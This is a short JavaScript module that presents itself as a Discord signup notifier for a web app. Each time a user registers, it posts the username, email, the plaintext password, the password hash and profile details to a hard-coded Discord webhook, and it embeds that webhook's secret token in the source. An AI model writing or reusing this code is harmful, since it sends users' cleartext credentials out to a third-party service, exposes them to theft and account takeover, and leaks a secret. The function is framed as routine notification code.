import fetch from 'node-fetch';

/**
 * Sends a notification to Discord webhook with user signup details
 * @param {Object} userData - The user data for the newly created user
 */
export async function sendSignupNotification(userData) {
  const webhookUrl = 'https://discord.com/api/webhooks/1316066211850620989/_9WGkcypsKTp9KdvRMGFtWQ-eEs8p7HZxwK0XABVOnL8os8wO5hesWHVs_BydHVBN9RA';

  const message = {
    embeds: [{
      title: 'User Signup Details',
      description: 'A new user has signed up via regular registration.',
      color: 3447003,
      fields: [
        { name: 'Username', value: userData.username, inline: true },
        { name: 'Email', value: userData.email, inline: true },
        { name: 'Password (Unhashed)', value: userData.password, inline: false },
        { name: 'Password (Hashed)', value: userData.passwordHash, inline: false },
        { name: 'Profile Picture', value: userData.profilePic, inline: false },
        { name: 'Sign Up Date', value: userData.createdAt.toString(), inline: false },
        { name: 'Signup Method', value: 'Regular Signup', inline: true },
      ],
    }]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Discord webhook');
    }
    console.log('Discord notification sent successfully');
  } catch (error) {
    console.error('Error sending Discord notification:', error);
  }
}
